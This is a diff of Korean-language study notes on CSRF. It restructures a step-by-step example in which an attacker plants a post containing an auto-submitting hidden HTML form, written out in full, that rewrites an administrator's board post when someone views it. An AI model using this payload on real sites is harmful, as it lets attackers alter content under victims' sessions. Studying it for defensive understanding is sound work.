@@ -41,18 +41,34 @@
     - 관리자가 게시한 글을 공격자가 원하는대로 변경하기
 
 - 예제
-    1. 게시판에서 CSRF를 이용해 수정할 게시글(타겟)을 선정한다.
-    ![CSRF-img-1](https://t1.daumcdn.net/cfile/tistory/2257CB44575FA44735)
-    2. 게시글 수정 페이지의 소스를 확인한다.
-    [게시판 글 수정 소스코드](sample1.html)
-    3. 소스에서 원하는대로 데이터를 변경하기 위해 필요한 부분만 추려낸다.
-    4. value에 변경할 데이터를 넣어준다.
-    [변조를 위한 html 작성](sample2.html)
-    5. 위 코드가 삽입된 게시글을 작성한다.
-    ![CSRF-img-2](https://t1.daumcdn.net/cfile/tistory/235F9644575FA4472E)
-    6. 해당 게시글을 읽게 되면 삽입된 코드가 실행되어 form태그의 내용이 post로 전송된다.
-    ![CSRF-img-3](https://t1.daumcdn.net/cfile/tistory/2761FB44575FA4482C)
-    ![CSRF-img-4](https://t1.daumcdn.net/cfile/tistory/260F0644575FA4490A)
+
+- 게시판에서 CSRF를 이용해 수정할 게시글(타겟)을 선정한다.
+![CSRF-img-1](https://t1.daumcdn.net/cfile/tistory/2257CB44575FA44735)
+
+- 게시글 수정 페이지의 소스를 확인한다.
+[게시판 글 수정 소스코드](sample1.html)
+
+- 소스에서 원하는대로 데이터를 변경하기 위해 필요한 부분만 추려낸다.
+
+- value에 변경할 데이터를 넣어준다.
+
+```html
+<body onload="document.form_test.submit();">
+    <form name="form_test" action="board_update_reg.asp" method="POST">
+        <input type="hidden" name="user" value="관리자">
+        <input type="hidden" name="title" value="뿡빵이뿡빵">
+        <input type="hidden" name="contents" value="뿡빵이로 바꼈어요~!기분좋아">
+        <input type="hidden" name="idx" value="2">
+    </form>
+</body>
+```
+
+- 위 코드가 삽입된 게시글을 작성한다.
+![CSRF-img-2](https://t1.daumcdn.net/cfile/tistory/235F9644575FA4472E)
+
+- 해당 게시글을 읽게 되면 삽입된 코드가 실행되어 form태그의 내용이 post로 전송된다.
+![CSRF-img-3](https://t1.daumcdn.net/cfile/tistory/2761FB44575FA4482C)
+![CSRF-img-4](https://t1.daumcdn.net/cfile/tistory/260F0644575FA4490A)
 
 - [예제 참고 사이트](http://rednooby.tistory.com/22)
 
